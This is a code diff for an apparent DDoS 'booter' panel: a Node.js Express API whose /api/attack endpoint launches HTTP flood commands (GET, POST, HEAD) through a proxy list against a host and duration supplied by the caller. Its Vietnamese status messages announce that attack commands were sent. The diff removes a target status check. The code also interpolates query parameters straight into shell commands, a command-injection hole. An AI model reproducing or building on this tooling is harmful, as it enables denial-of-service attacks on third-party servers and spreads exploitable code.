@@ -60,26 +60,16 @@ const executeAllAttacks = (methods, host, time) =>
     methods.map((method) => `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`)
         .forEach((command) => executeAttack(command, time));
 
-const checkServerStatus = async (host) => {
-    try {
-        const response = await axios.get(host);
-        return response.status;
-    } catch (error) {
-        return error.response ? error.response.status : 500;
-    }
-};
-
-app.get("/api/attack", async (req, res) => {
+app.get("/api/attack", (req, res) => {
     const { key, host, time, method, port, modul } = req.query;
-    const statusCode = await checkServerStatus(host);
 
     if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) {
-        return res.json({ status: "ERROR", statuscode: statusCode, message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC" });
+        return res.json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC" });
     }
 
     const validationMessage = validateInput({ key, host, time, method, port });
     if (validationMessage) {
-        return res.json({ status: "ERROR", statuscode: statusCode, message: validationMessage });
+        return res.json({ status: "ERROR", message: validationMessage });
     }
 
     activeAttacks++;
@@ -87,14 +77,14 @@ app.get("/api/attack", async (req, res) => {
     if (modul === "FULL") {
         executeAllAttacks(["GET", "POST", "HEAD"], host, time);
         res.json({
-            status: "SUCCESS", statuscode: statusCode, message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI",
+            status: "SUCCESS", message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI",
             host: host, port: port, time: time, modul: "GET POST HEAD", method: method, pid: currentPID
         });
     } else {
         const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
         executeAttack(command, time);
         res.json({
-            status: "SUCCESS", statuscode: statusCode, message: "LỆNH TẤN CÔNG ĐÃ GỬI",
+            status: "SUCCESS", message: "LỆNH TẤN CÔNG ĐÃ GỬI",
             host: host, port: port, time: time, modul: modul, method: method, pid: currentPID
         });
     }
